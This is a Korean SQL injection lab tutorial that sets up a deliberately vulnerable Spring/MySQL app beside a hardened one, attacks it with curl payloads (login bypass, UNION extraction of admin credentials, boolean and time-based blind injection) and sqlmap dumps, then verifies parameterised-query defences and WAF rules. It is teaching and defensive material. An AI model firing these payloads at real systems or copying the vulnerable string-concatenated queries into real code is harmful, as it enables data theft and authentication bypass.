# 실전 실습: SQL Injection 취약점 재현 및 방어 검증

---

## 🎯 핵심 질문

Docker를 사용하여 취약한 환경과 방어된 환경을 동시에 구성할 수 있는가? sqlmap으로 자동화된 공격을 단계별로 이해하고 방어 검증할 수 있는가? 실제 프로젝트에 적용 가능한 테스트 시나리오는 무엇인가?

## 🔍 실습 환경 설명

이 실습에서는 다음 환경을 구성합니다:

1. **취약한 애플리케이션** (vulnerable-app): SQL Injection 가능
2. **방어된 애플리케이션** (secure-app): PreparedStatement 적용
3. **데이터베이스**: MySQL (기본 설정)
4. **침투 테스트 도구**: sqlmap (자동화), curl (수동)
5. **모니터링**: MySQL 슬로우 쿼리 로그, 애플리케이션 로그

## 😱 취약한 애플리케이션 구성

### 1. Docker Compose 설정 (docker-compose.yml)

```yaml
version: '3.8'

services:
  # ========== 데이터베이스 ==========
  db:
    image: mysql:8.0
    container_name: sqli-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root_password_123
      MYSQL_DATABASE: vulnerable_db
      MYSQL_USER: app_user
      MYSQL_PASSWORD: app_password
    ports:
      - "3306:3306"
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
      - db-data:/var/lib/mysql
    command: 
      - --slow_query_log=1
      - --long_query_time=0.5
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 10s
      timeout: 5s
      retries: 5

  # ========== 취약한 애플리케이션 ==========
  vulnerable-app:
    build:
      context: ./vulnerable-app
      dockerfile: Dockerfile
    container_name: vulnerable-sqli-app
    environment:
      SPRING_DATASOURCE_URL: jdbc:mysql://db:3306/vulnerable_db
      SPRING_DATASOURCE_USERNAME: app_user
      SPRING_DATASOURCE_PASSWORD: app_password
      JAVA_OPTS: "-Dlogging.level.org.springframework.jdbc=DEBUG"
    ports:
      - "8080:8080"
    depends_on:
      db:
        condition: service_healthy

  # ========== 방어된 애플리케이션 ==========
  secure-app:
    build:
      context: ./secure-app
      dockerfile: Dockerfile
    container_name: secure-sqli-app
    environment:
      SPRING_DATASOURCE_URL: jdbc:mysql://db:3306/vulnerable_db
      SPRING_DATASOURCE_USERNAME: app_user
      SPRING_DATASOURCE_PASSWORD: app_password
    ports:
      - "8081:8080"
    depends_on:
      db:
        condition: service_healthy

volumes:
  db-data:
```

### 2. 데이터베이스 초기 설정 (init.sql)

```sql
-- 사용자 테이블
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- 관리자 정보 테이블 (민감 정보)
CREATE TABLE IF NOT EXISTS admin_credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    admin_username VARCHAR(50) NOT NULL,
    api_secret_key VARCHAR(255) NOT NULL,
    db_admin_password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- 주문 테이블
CREATE TABLE IF NOT EXISTS orders (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    product_name VARCHAR(100) NOT NULL,
    amount DECIMAL(10, 2) NOT NULL,
    status VARCHAR(20) DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- 테스트 데이터
INSERT INTO users (username, email, password_hash, role) VALUES
('admin', 'admin@example.com', 'hashed_password_admin123', 'admin'),
('john', 'john@example.com', 'hashed_password_john456', 'user'),
('alice', 'alice@example.com', 'hashed_password_alice789', 'user'),
('bob', 'bob@example.com', 'hashed_password_bob012', 'user');

INSERT INTO admin_credentials (admin_username, api_secret_key, db_admin_password) VALUES
('admin_sys', 'secret_key_xyz_abc_123_def', 'mysql_root_password_super_secret');

INSERT INTO orders (user_id, product_name, amount, status) VALUES
(1, 'Laptop', 1200.00, 'completed'),
(2, 'Mouse', 25.50, 'completed'),
(3, 'Keyboard', 75.00, 'pending'),
(4, 'Monitor', 350.00, 'shipped');
```

### 3. 취약한 애플리케이션 (vulnerable-app/src/main/java/VulnerableController.java)

```java
package com.example.vulnerable;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/api")
public class VulnerableController {
    
    @Autowired
    private JdbcTemplate jdbcTemplate;
    
    // ========== 취약점 1: 기본 SQL Injection ==========
    
    @GetMapping("/login")
    public ResponseEntity<?> login(@RequestParam String username, 
                                    @RequestParam String password) {
        // [위험] 사용자 입력을 직접 SQL에 연결
        String query = "SELECT * FROM users WHERE username = '" + username 
                     + "' AND password_hash = '" + password + "'";
        
        System.out.println("[DEBUG] SQL Query: " + query);
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);
            
            if (!result.isEmpty()) {
                return ResponseEntity.ok("Login successful!");
            } else {
                return ResponseEntity.status(401).body("Invalid credentials");
            }
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Error: " + e.getMessage());
        }
    }
    
    // ========== 취약점 2: UNION 기반 정보 추출 ==========
    
    @GetMapping("/search")
    public ResponseEntity<?> searchUser(@RequestParam String name) {
        // [위험] LIKE 절에서 문자열 연결
        String query = "SELECT id, username, email FROM users WHERE username LIKE '%" 
                     + name + "%'";
        
        System.out.println("[DEBUG] SQL Query: " + query);
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);
            return ResponseEntity.ok(result);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Error: " + e.getMessage());
        }
    }
    
    // ========== 취약점 3: Error-Based Extraction ==========
    
    @GetMapping("/user/{id}")
    public ResponseEntity<?> getUser(@PathVariable String id) {
        // [위험] ID를 직접 SQL에 삽입
        String query = "SELECT id, username, email FROM users WHERE id = '" + id + "'";
        
        System.out.println("[DEBUG] SQL Query: " + query);
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);
            if (!result.isEmpty()) {
                return ResponseEntity.ok(result.get(0));
            } else {
                return ResponseEntity.status(404).body("User not found");
            }
        } catch (Exception e) {
            // [위험] 에러 메시지 그대로 반환 (정보 유출)
            return ResponseEntity.status(500).body("Error: " + e.getMessage());
        }
    }
    
    // ========== 취약점 4: Blind SQL Injection ==========
    
    @GetMapping("/verify")
    public ResponseEntity<?> verifyUser(@RequestParam String username) {
        // [위험] 응답이 참/거짓으로 나뉨 (Boolean-based Blind SQLi)
        String query = "SELECT COUNT(*) FROM users WHERE username = '" + username + "'";
        
        System.out.println("[DEBUG] SQL Query: " + query);
        
        try {
            Integer count = jdbcTemplate.queryForObject(query, Integer.class);
            
            if (count > 0) {
                return ResponseEntity.ok("User exists");
            } else {
                return ResponseEntity.ok("User does not exist");
            }
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Error");
        }
    }
    
    // ========== 취약점 5: 복잡한 동적 쿼리 ==========
    
    @GetMapping("/advanced-search")
    public ResponseEntity<?> advancedSearch(
            @RequestParam(required = false) String username,
            @RequestParam(required = false) String email,
            @RequestParam(required = false) String role) {
        
        // [위험] 동적 쿼리 구성 (모든 필터가 취약)
        String query = "SELECT * FROM users WHERE 1=1";
        
        if (username != null && !username.isEmpty()) {
            query += " AND username = '" + username + "'";
        }
        
        if (email != null && !email.isEmpty()) {
            query += " AND email = '" + email + "'";
        }
        
        if (role != null && !role.isEmpty()) {
            query += " AND role = '" + role + "'";
        }
        
        System.out.println("[DEBUG] SQL Query: " + query);
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);
            return ResponseEntity.ok(result);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Error: " + e.getMessage());
        }
    }
}
```

### 4. Dockerfile (vulnerable-app/Dockerfile)

```dockerfile
FROM openjdk:11-jre-slim

WORKDIR /app

COPY target/vulnerable-app.jar app.jar

EXPOSE 8080

ENTRYPOINT ["java", "-jar", "app.jar"]
```

### 5. pom.xml 설정

```xml
<properties>
    <spring-boot.version>2.7.0</spring-boot.version>
</properties>

<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-jdbc</artifactId>
    </dependency>
    
    <dependency>
        <groupId>mysql</groupId>
        <artifactId>mysql-connector-java</artifactId>
        <version>8.0.28</version>
    </dependency>
</dependencies>
```

## ✨ 방어된 애플리케이션 (secure-app)

```java
package com.example.secure;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageImpl;
import org.springframework.data.domain.Pageable;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import java.util.*;

@RestController
@RequestMapping("/api")
public class SecureController {
    
    @Autowired
    private JdbcTemplate jdbcTemplate;
    
    // ========== 방어 1: PreparedStatement 사용 ==========
    
    @GetMapping("/login")
    public ResponseEntity<?> login(@RequestParam String username, 
                                    @RequestParam String password) {
        // [방어] PreparedStatement로 파라미터 분리
        String query = "SELECT * FROM users WHERE username = ? AND password_hash = ?";
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query, username, password);
            
            if (!result.isEmpty()) {
                return ResponseEntity.ok("Login successful!");
            } else {
                // [방어] 에러 메시지 일반화
                return ResponseEntity.status(401).body("Invalid credentials");
            }
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // ========== 방어 2: LIKE 쿼리 안전 처리 ==========
    
    @GetMapping("/search")
    public ResponseEntity<?> searchUser(@RequestParam String name) {
        // [방어] 입력 검증
        if (name == null || name.length() > 50) {
            return ResponseEntity.badRequest().body("Invalid input");
        }
        
        // [방어] 화이트리스트 검증
        if (!name.matches("^[a-zA-Z0-9\\s._-]+$")) {
            return ResponseEntity.badRequest().body("Invalid characters");
        }
        
        // [방어] PreparedStatement와 Java 와일드카드 처리
        String query = "SELECT id, username, email FROM users WHERE username LIKE ?";
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(
                query,
                "%" + name + "%"  // 와일드카드는 Java에서 처리
            );
            return ResponseEntity.ok(result);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // ========== 방어 3: ID 검증 ==========
    
    @GetMapping("/user/{id}")
    public ResponseEntity<?> getUser(@PathVariable String id) {
        // [방어] 숫자 형식 검증
        if (!id.matches("^[0-9]+$")) {
            return ResponseEntity.badRequest().body("Invalid ID format");
        }
        
        String query = "SELECT id, username, email FROM users WHERE id = ?";
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query, Long.parseLong(id));
            
            if (!result.isEmpty()) {
                return ResponseEntity.ok(result.get(0));
            } else {
                return ResponseEntity.status(404).body("User not found");
            }
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // ========== 방어 4: Boolean 검증 (Blind SQLi 방지) ==========
    
    @GetMapping("/verify")
    public ResponseEntity<?> verifyUser(@RequestParam String username) {
        // [방어] 입력 검증
        if (!username.matches("^[a-zA-Z0-9_]{3,50}$")) {
            return ResponseEntity.badRequest().body("Invalid username");
        }
        
        // [방어] 응답 시간 균등화
        long startTime = System.currentTimeMillis();
        
        String query = "SELECT COUNT(*) FROM users WHERE username = ?";
        
        try {
            Integer count = jdbcTemplate.queryForObject(query, Integer.class, username);
            
            // [방어] 응답 시간 균등화 (타이밍 공격 방지)
            long duration = System.currentTimeMillis() - startTime;
            randomDelay(Math.max(0, 100 - duration), 100);
            
            if (count > 0) {
                return ResponseEntity.ok("User exists");
            } else {
                return ResponseEntity.ok("User does not exist");
            }
        } catch (Exception e) {
            randomDelay(80, 120);
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // ========== 방어 5: 동적 쿼리 안전 처리 ==========
    
    @GetMapping("/advanced-search")
    public ResponseEntity<?> advancedSearch(
            @RequestParam(required = false) String username,
            @RequestParam(required = false) String email,
            @RequestParam(required = false) String role) {
        
        // [방어] 모든 입력 검증
        if (username != null && !username.matches("^[a-zA-Z0-9_]{0,50}$")) {
            return ResponseEntity.badRequest().body("Invalid username");
        }
        
        if (email != null && !email.matches("^[a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$")) {
            return ResponseEntity.badRequest().body("Invalid email");
        }
        
        if (role != null && !role.matches("^(admin|user|moderator)$")) {
            return ResponseEntity.badRequest().body("Invalid role");
        }
        
        // [방어] 동적 쿼리 안전 구성
        StringBuilder queryBuilder = new StringBuilder("SELECT * FROM users WHERE 1=1");
        List<Object> params = new ArrayList<>();
        
        if (username != null && !username.isEmpty()) {
            queryBuilder.append(" AND username = ?");
            params.add(username);
        }
        
        if (email != null && !email.isEmpty()) {
            queryBuilder.append(" AND email = ?");
            params.add(email);
        }
        
        if (role != null && !role.isEmpty()) {
            queryBuilder.append(" AND role = ?");
            params.add(role);
        }
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(
                queryBuilder.toString(),
                params.toArray()
            );
            return ResponseEntity.ok(result);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // 유틸리티 메서드
    private void randomDelay(long minMs, long maxMs) {
        if (minMs < 0 || maxMs < minMs) {
            return;
        }
        
        long delay = minMs + (long) (Math.random() * (maxMs - minMs + 1));
        try {
            Thread.sleep(delay);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
```

## 💻 실전 실험 (단계별 공격과 방어 검증)

### 실습 1: 환경 구성

```bash
# 1. 프로젝트 디렉토리 생성
mkdir -p injection-lab/{vulnerable-app,secure-app}
cd injection-lab

# 2. docker-compose.yml 저장
cat > docker-compose.yml << 'EOF'
# 위의 docker-compose.yml 내용 붙여넣기
EOF

# 3. init.sql 저장
cat > init.sql << 'EOF'
# 위의 init.sql 내용 붙여넣기
EOF

# 4. 취약한 애플리케이션 빌드
cd vulnerable-app
mvn clean package -DskipTests
cd ..

# 5. 방어된 애플리케이션 빌드
cd secure-app
mvn clean package -DskipTests
cd ..

# 6. Docker Compose 실행
docker-compose up -d

# 7. 서비스 상태 확인
docker-compose ps
```

### 실습 2: 취약한 애플리케이션 공격

```bash
# ========== 2-1: 기본 로그인 우회 ==========

# 공격 1: OR 연산자로 인증 우회
curl -X GET "http://localhost:8080/api/login" \
  -G --data-urlencode "username=admin' --" \
  --data-urlencode "password=anything"

# 응답: Login successful!
# 실행된 쿼리: SELECT * FROM users WHERE username = 'admin' --' AND password_hash = 'anything'

# 공격 2: OR 1=1로 모든 사용자 로그인
curl -X GET "http://localhost:8080/api/login" \
  -G --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=anything"

# 응답: Login successful!

# ========== 2-2: UNION으로 정보 추출 ==========

# 공격: 관리자 정보 추출
curl -X GET "http://localhost:8080/api/search" \
  -G --data-urlencode "name=' UNION SELECT 1, admin_username, db_admin_password FROM admin_credentials WHERE '1'='1"

# 응답:
# [
#   {"id": 1, "username": "admin_sys", "email": "mysql_root_password_super_secret"},
#   ...
# ]

# ========== 2-3: Error-Based 추출 ==========

# 공격: 에러 메시지에서 데이터 추출
curl -X GET "http://localhost:8080/api/user/1' AND 1=0 UNION SELECT 1, username, password_hash FROM users LIMIT 1 -- "

# 응답: 에러 메시지에 데이터 포함

# ========== 2-4: Blind SQL Injection (Boolean-Based) ==========

# 공격: 관리자 비밀번호 첫글자 추출
curl -X GET "http://localhost:8080/api/verify" \
  -G --data-urlencode "username=admin' AND SUBSTRING((SELECT db_admin_password FROM admin_credentials LIMIT 1), 1, 1) = 'm"

# 응답: "User exists" (첫글자가 'm')

# ========== 2-5: sqlmap 자동화 ==========

# sqlmap 설치 (Kali Linux)
apt-get install sqlmap

# 또는 GitHub에서 설치
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# 취약한 login 엔드포인트 테스트
python3 sqlmap.py -u "http://localhost:8080/api/login?username=admin&password=password" \
  --batch \
  --dbs \
  --threads=4

# 출력:
# [16:30:15] [INFO] available databases [2]:
# [*] information_schema
# [*] vulnerable_db

# 데이터베이스 덤프
python3 sqlmap.py -u "http://localhost:8080/api/login?username=admin&password=password" \
  --batch \
  -D vulnerable_db \
  --tables

# 사용자 테이블 덤프
python3 sqlmap.py -u "http://localhost:8080/api/login?username=admin&password=password" \
  --batch \
  -D vulnerable_db \
  -T users \
  --dump

# 출력:
# Database: vulnerable_db
# Table: users
# [4 entries]
# +----+---------+---------------------+--------------------+-------+---------------------+
# | id | username| email               | password_hash      | role  | created_at          |
# +----+---------+---------------------+--------------------+-------+---------------------+
# | 1  | admin   | admin@example.com   | hashed_password... | admin | 2023-01-01 10:00:00 |
# | 2  | john    | john@example.com    | hashed_password... | user  | 2023-01-02 10:00:00 |
# ...
```

### 실습 3: 방어된 애플리케이션 검증

```bash
# ========== 3-1: 같은 공격 시도 (모두 차단) ==========

# 공격: OR 연산자
curl -X GET "http://localhost:8081/api/login" \
  -G --data-urlencode "username=admin' --" \
  --data-urlencode "password=anything"

# 응답: Invalid credentials
# (username = "admin' --" 인 사용자 없음)

# 공격: UNION SELECT
curl -X GET "http://localhost:8081/api/search" \
  -G --data-urlencode "name=' UNION SELECT 1, admin_username, db_admin_password FROM admin_credentials"

# 응답: 400 Bad Request - Invalid characters
# (특수문자 필터링으로 거부됨)

# ========== 3-2: sqlmap 실행 (취약점 없음) ==========

python3 sqlmap.py -u "http://localhost:8081/api/login?username=admin&password=password" \
  --batch \
  --dbs

# 출력: [*] target URL does not seem to be vulnerable to SQL injection attacks
# (sqlmap이 취약점 감지 불가)

# ========== 3-3: 정상 요청 ==========

# 정상 로그인
curl -X GET "http://localhost:8081/api/login" \
  -G --data-urlencode "username=admin" \
  --data-urlencode "password=hashed_password_admin123"

# 응답: Login successful!

# 정상 검색
curl -X GET "http://localhost:8081/api/search" \
  -G --data-urlencode "name=ad"

# 응답:
# [
#   {"id": 1, "username": "admin", "email": "admin@example.com"}
# ]
```

### 실습 4: 모니터링 및 로깅

```bash
# ========== 4-1: MySQL 슬로우 쿼리 로그 확인 ==========

# 컨테이너에 접속
docker exec -it sqli-mysql bash

# MySQL에 접속
mysql -u root -proot_password_123

# 슬로우 쿼리 로그 확인
SELECT * FROM mysql.slow_log;

# 또는 파일로 확인
tail -f /var/log/mysql/slow.log

# ========== 4-2: 애플리케이션 로그 확인 ==========

# 취약한 앱의 로그 (SQL 쿼리 표시)
docker logs -f vulnerable-sqli-app | grep "DEBUG"

# 예시:
# [DEBUG] SQL Query: SELECT * FROM users WHERE username = 'admin' --' AND password_hash = 'anything'

# ========== 4-3: 의심 활동 감지 ==========

# 애플리케이션 레벨 감시
# 패턴: SQL 메타문자 포함 요청 빠르게 증가
# 또는: 같은 파라미터로 여러 에러 발생

# WAF (Web Application Firewall) 규칙 예시:
# Rule 1: SQL 메타문자 감지 (', ", ;, --, /*, */)
# Rule 2: UNION 키워드 감지
# Rule 3: SLEEP() 함수 호출 감지
# Rule 4: 같은 엔드포인트에서 초당 5회 이상 400 에러
```

## 📊 공격 vs 방어 비교

```
취약한 애플리케이션:
┌────────────────────────────────────────────────────┐
│ 공격 입력: admin' --                               │
│ 생성된 쿼리: SELECT * FROM users WHERE             │
│   username = 'admin' --' AND password = 'x'        │
│ 결과: 🔓 로그인 성공 (인증 우회)                    │
└────────────────────────────────────────────────────┘

방어된 애플리케이션:
┌────────────────────────────────────────────────────┐
│ 공격 입력: admin' --                               │
│ PreparedStatement: SELECT * FROM users WHERE       │
│   username = ? AND password = ?                    │
│ 바인딩: username = "admin' --" (리터럴 문자열)     │
│ 결과: 🔐 로그인 실패 (공격 차단)                    │
└────────────────────────────────────────────────────┘
```

## 📌 핵심 정리

### 이 실습에서 배운 것:

1. **환경 구성**: Docker Compose로 취약/방어 환경 동시 구성 가능

2. **공격 벡터 다양성**: SQL Injection은 로그인, 검색, 고급 필터 등 모든 계층에서 발생

3. **자동화 도구**: sqlmap으로 모든 매개변수를 자동으로 테스트 가능

4. **방어 확인**: 입력 검증 + PreparedStatement로 완전히 차단 가능

5. **모니터링**: 로그와 슬로우 쿼리를 통해 공격 탐지 가능

### 실무 적용:

1. **개발 단계**: 취약한 코드 패턴 교육 (이 실습 사용)
2. **테스트 단계**: sqlmap으로 자동화된 침투 테스트
3. **운영 단계**: WAF + 로깅으로 실시간 모니터링
4. **사후 분석**: 공격 로그 수집 및 분석

## 🤔 심화 실습 (선택사항)

```bash
# ========== 심화 1: Time-Based Blind SQLi ==========

# 공격: SLEEP() 함수로 시간차 생성
curl -X GET "http://localhost:8080/api/verify" \
  -G --data-urlencode "username=admin' AND SLEEP(5) -- "

# 응답이 5초 지연되면 조건이 참이라는 증거

# 방어된 앱에서는:
# (PreparedStatement로 username = "admin' AND SLEEP(5) --" 검색)
# 응답: "User does not exist" (즉시)

# ========== 심화 2: 데이터베이스 권한 시뮬레이션 ==========

# 최소 권한 계정 (SELECT만)
CREATE USER 'limited_user'@'localhost' IDENTIFIED BY 'limited_pass';
GRANT SELECT ON vulnerable_db.users TO 'limited_user'@'localhost';

# SQL Injection 발생해도:
# SELECT OK (데이터 조회 가능)
# DELETE, UPDATE, DROP 불가능

# ========== 심화 3: WAF 규칙 테스트 ==========

# ModSecurity (OWASP CRS) 설치 후:
# Rule 921110: Detects UNION SQL Injection Attacks
# Rule 921120: Detects Blind SQL Injection Attacks

# 테스트:
curl -X GET "http://localhost:8080/api/search?name=' UNION SELECT 1 -- " \
  -v

# WAF가 요청을 차단하면:
# HTTP/1.1 403 Forbidden
# X-WAF-Blocked: true
```

---

<div align="center">

**[⬅️ 이전: 인젝션 방어 원칙](./06-injection-defense-principles.md)** | **[홈으로 🏠](../README.md)** | **[다음: Chapter 3 — JWT 취약점 완전 분해 ➡️](../authentication-session/01-jwt-vulnerabilities.md)**

</div>
